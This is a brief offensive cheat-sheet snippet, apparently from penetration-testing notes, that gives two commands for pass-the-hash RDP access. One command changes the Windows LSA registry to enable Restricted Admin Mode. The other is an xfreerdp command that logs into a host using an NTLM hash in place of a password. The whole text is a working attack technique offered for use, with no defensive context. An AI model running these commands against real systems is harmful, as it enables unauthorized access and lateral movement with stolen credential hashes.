Restricted Admin Mode must be enabled. We can do this by adding a regkey:
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Then use the -pth option in xfreerdp:
```shell
xfreerdp  /v:10.1.2.3 /u:username /pth:64F12CDDAA88057E06A81B54E73B949B
```

